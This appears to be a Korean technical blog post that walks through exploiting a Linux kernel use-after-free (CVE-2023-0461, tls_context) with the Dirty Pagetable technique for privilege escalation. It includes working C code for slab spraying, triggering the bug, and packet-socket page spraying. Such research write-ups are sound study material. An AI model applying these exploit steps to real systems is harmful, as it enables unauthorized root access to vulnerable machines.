## Overview
이 글에서는 최근 널리 사용되는 공격 기법을 실제 취약점에 적용하여 권한 상승을 달성하는 과정을 다룹니다. 특히, `tls_context` 객체의 UAF 취약점을 이용한 Dirty Pagetable 공격을 통해 이 기법을 자세히 살펴보겠습니다.

이 글에서는 취약점에 대한 구체적인 내용보다는 악용 기법에 초점을 맞추겠습니다. 취약점에 대한 심층 분석 및 PoC는 [이전 글](https://gimmia.github.io/posts/poc/)에서 다루고 있습니다. 전체 익스플로잇 코드는 제 [깃허브](https://github.com/gimmia/1-day-study/blob/main/linux_kernel/CVE/2023/0461/exploit/exp.c)에서 볼 수 있습니다.

## What's vulnerable?
2023년, [0xdevil](https://syst3mfailure.io/)와 [koczkatamas](https://github.com/koczkatamas)는 CONFIG_TLS가 활성화된 커널에서 사용자가 TCP 소켓을 연결하고 TLS 컨텍스트를 설치한 소켓을 닫을 때 `inet_connection_sock` 구조체의 `icsk_ulp_data`가 지워지지 않는 use-after-free 버그를 발견했습니다. `icsk_ulp_data`는 `tls_context` 객체에 대한 포인터입니다. 이 취약점은 복제된 소켓이 부모의 `icsk_ulp_data`를 공유하기 때문에 double-free 및 use-after-free로 쉽게 이어질 수 있습니다. 해당 버그는 4.13-rc1 - 6.2-rc3 커널 버전의 net/tls.ko 모듈에서 영향을 받습니다.

## Notes on Dirty Pagetable
커널은 페이지 테이블(PTE)을 할당할 때, 버디 할당자에게 사용 가능한 페이지를 요청합니다. 할당자가 ZONE NORMAL의 `free_area[ORDER 0]->free_list[UNMOVABLE]`에서 페이지 하나를 반환해주면 커널은 여기에 **PFN**과 **flags**를 entry 값으로 기록하게 됩니다. 만약 우리가 버디 할당자에서 해제된 페이지를 제어할 수 있다면, 커널이 해당 페이지 테이블 할당에 재사용하도록 만들 수 있습니다. 커널이 취약한 페이지를 PTE로 사용하기 시작하면, **entry** 값을 원하는 마음대로 덮어쓸 수 있습니다.

**Dirty pagetable** 기법은 해제되었지만 아직 회수되지 않은 dangling page를 악용하여 PTE를 손상시킵니다. PTE에 기록된 PFN과 flags를 수정함으로써 사용자 공간의 가상 주소를 임의의 커널 공간 물리 주소로 바꿔치기 할 수 있습니다. 이를 통해 유저 공간에서 커널 메모리의 특정 영역(`do_symlinkat()`)을 쉘코드로 덮어쓰고 실행할 수 있습니다.

이 익스플로잇은 객체에 대한 use-after-free가 어떻게 dangling page를 생성하고 dirty pagetable로 이어질 수 있는지 보여줍니다.

## Step-by-Step Exploitation
전체 익스플로잇 과정은 가독성을 위해 총 3단계로 나누어 작성되었으며, 모든 과정은 6.1.0 커널 버전에서 진행되었습니다.
### Step 1. kmalloc-512 spray for flushing per-CPU page list
`tls_context` 객체는 kmalloc-512 슬랩에서 할당되며, 이 슬랩 페이지는 **UNMOVABLE** migration type에 **order-1** 크기를 가집니다. 하지만 앞서 언급했던 것처럼 커널은 order-0인 페이지를 PTE로 할당받기 때문에 슬랩 페이지를 낮은 order로 이동시켜야 합니다. 

먼저, use-after-free 취약점을 가진 슬랩 페이지를 kmalloc-512 캐시에서 해제시키기 위해 `msg_msg` 객체들을 spray 합니다. `user_key_payload` 객체는 kmalloc-512에 대한 노이즈로 인해 고려되지 않았습니다.
```c
tls_p = setup_socket(1234);

setup_msg('A');
for (int i = 0; i < MSG_SPRAY; i++) 
{
    msg_alloc(i);
}

tls_alloc(tls_p);
tls_c = tls_copy(tls_p, 5678); 
tls_g = tls_copy(tls_c, 9100);
close(tls_p);

setup_msg('B');
for (int i = MSG_SPRAY; i < K512_VICTIM_CHUNKS; i++) 
{
    msg_alloc(i);
}
```
이제 할당된 객체들을 모두 해제하면 partial list의 수용 한계를 넘게 되어 empty slab들이 캐시에서 해제됩니다. `icsk_ulp_data`는 소켓을 `close()`할 때 `kfree_rcu()`로 인해 해제가 6초 지연된다는 점은 나중에 정말 유용하게 쓰일 수 있습니다.
```c
sleep(6);
close(tls_c);
close(tls_g);

for (int i = K512_VICTIM_CHUNKS - 1; i >= 0 ; i--) 
{
    msg_free(i);
}
```
kmalloc-512 캐시에서 해제된 슬랩 페이지들은 **per-CPU page list**에 반환됩니다. PCP list는 각 CPU별로 존재하는 페이지 캐시로써 order-3 이하의 페이지 요청을 빠르게 처리하는 것이 주된 목적이기 때문에 할당자는 제일 먼저 PCP list에서 페이지를 찾고 할당해줍니다.

PCP list는 `per_cpu_pages`로 표현되며, 해제된 페이지들은 `lists[]` 배열에 저장된 여러 목록으로 구성됩니다. 사용할 수 있는 페이지가 모두 소진되었을 때는 `batch` 단위로 버디 할당자에서 한 번에 가져옵니다. 반대로 해제된 페이지의 개수를 기록하는 `count`가 `high`를 초과하여 페이지를 버디 할당자로 돌려보낼 때도 `batch` 단위로 반환합니다.
```c
struct per_cpu_pages {
	spinlock_t lock;	  /* Protects lists field */
	int count;		      /* number of pages in the list */
	int high;		        /* high watermark, emptying needed */
	int batch;		      /* chunk size for buddy add/remove */
  // ...
	struct list_head lists[NR_PCP_LISTS];
}
```
`lists[]` 배열은 최대 [NR_PCP_LISTS](https://elixir.bootlin.com/linux/v6.1/source/include/linux/mmzone.h#L566)개의 리스트를 포함할 수 있으며, `CONFIG_TRANSPARENT_HUGEPAGE` 기능이 비활성화 상태일 경우 12개의 리스트를 가집니다. 이는 각 order의 페이지들을 3가지의 migration type(`UNMOVABLE`, `MOVABLE`, `RECLAIMABLE`)으로 관리하기 위함입니다. kmalloc-512 슬랩은 해제될 때 `lists[3]`에 연결되며, 이는 order-1 UNMOVABLE에 해당합니다. 
```shell
$1 = {
  # ...
  count = 0x104,
  high = 0x16c,
  batch = 0x3f,
  free_factor = 0x0,
  expire = 0x0,
  lists = {{
      next = 0xffffea000400c8c8,  # order-0  UNMOVABLE
      prev = 0xffffea00040970c8
    }, {
      next = 0xffff88813bc2e768,  # order-0  MOVABLE
      prev = 0xffff88813bc2e768
    }, {
      next = 0xffffea0004013688,  # order-0  RECLAIMABLE
      prev = 0xffffea00040135c8
    }, {
      next = 0xffff88813bc2e788,  # order-1  UNMOVABLE
      prev = 0xffff88813bc2e788
    },
    # ...
    }
}
```
그럼 이제 페이지 스프레이를 통해서 해제된 취약한 슬랩 페이지를 PTE로 할당할 수 있을까요?
아쉽게도 PCP list는 버디 할당자와 다르게 특정 크기의 페이지가 모두 소진되었을 때 PCP list 내의 다른 order나 migration type에서 가져오지 않고 버디 할당자를 이용합니다.

그렇기 때문에 우리는 악용할 페이지를 PCP list에서 flush 되도록 유도해 버디 할당자로 반환된 대상 페이지를 스프레이하여 `pcp->lists[0]`에 재배치가 되도록 해야 PTE로 할당할 수 있습니다.

다음 매크로 변수는 `msg_msg` 객체를 할당하고 해제할 때 대상 페이지를 partial list와 PCP list에서 flush를 유도하기에 충분한 객체를 제공합니다.
```c
#define OBJS_PER_SLAB_512   16
#define CPU_PARTIAL_512     52
#define K512_VICTIM_CHUNKS  (OBJS_PER_SLAB_512 * (CPU_PARTIAL_512 + 1) * 4)

#define HEADER_SIZE     48
#define MSG_DATA_SIZE   (512 - HEADER_SIZE)
#define MSG_SPRAY       (K512_VICTIM_CHUNKS / 2)
```

### Step 2. page spray via packet sockets
우리가 페이지를 PTE로 할당하고 제대로 공격에 활용하기 위해서는 페이지에 대한 Memory Read/Write Primitive를 얻어야 합니다. 이러한 능력은 사용자가 언제든지 원하는 값을 쓰거나 읽을 수 있도록 커널 메모리를 유저 공간에 매핑하는 기능을 활용하면 더욱 쉽게 달성할 수 있습니다. 그런데, 이런 편리한 기능이 과연 실제로 존재할까요?

2017년에 게시된 [Project Zero](https://projectzero.google/2017/05/exploiting-linux-kernel-via-packet.html)의 문서에서는 페이지 할당 기법을 기반으로 한 아주 좋은 방법을 알려주고 있습니다. [packet_set_ring()](https://elixir.bootlin.com/linux/v6.1/source/net/packet/af_packet.c#L4360)와 [packet_mmap()](https://elixir.bootlin.com/linux/v6.1/source/net/packet/af_packet.c#L4527) 코드를 함께 보면 소켓의 패킷 버전과 옵션을 각각 `TPACKET_V3`, `PACKET_RX_RING`으로 설정했을 때, `alloc_pg_vec()`에서 할당한 페이지로 `rb->pg_vec`를 초기화하고 `packet_mmap()`이 호출될 때 `vm_insert_page()`에서 해당 페이지와 유저 메모리를 매핑합니다.

이 방법은 기본적으로 권한이 낮은 사용자는 루트 네임스페이스에서 해당 기능을 사용할 수 없습니다. 하지만 대부분의 Linux 시스템에서는 `unshare()`를 사용해 권한이 없는 사용자 지정 네임스페이스를 만들 수 있습니다. 
```c
int alloc_packet_ring_buffer(int i, int block_size, int frame_size, int blocknum)
{
    struct tpacket_req3 req;
    int v = TPACKET_V3;

    int rv = setsockopt(socketfds[i], SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
	  if (rv < 0) 
    {
		    perror("[x] setsockopt(PACKET_VERSION)");
        printf("    socketfds[%d]: %d\n", i, socketfds[i]);
		    exit(1);
	  }

    memset(&req, 0, sizeof(req));
    req.tp_block_size = block_size;
    req.tp_frame_size = frame_size;
    req.tp_block_nr = blocknum;
    req.tp_frame_nr = (block_size * blocknum) / frame_size;
    req.tp_retire_blk_tov = 60;

    rv = setsockopt(socketfds[i], SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
	  if (rv < 0) 
    {
		    perror("[x] setsockopt(PACKET_RX_RING)");
		    exit(1);
	  }
}
```
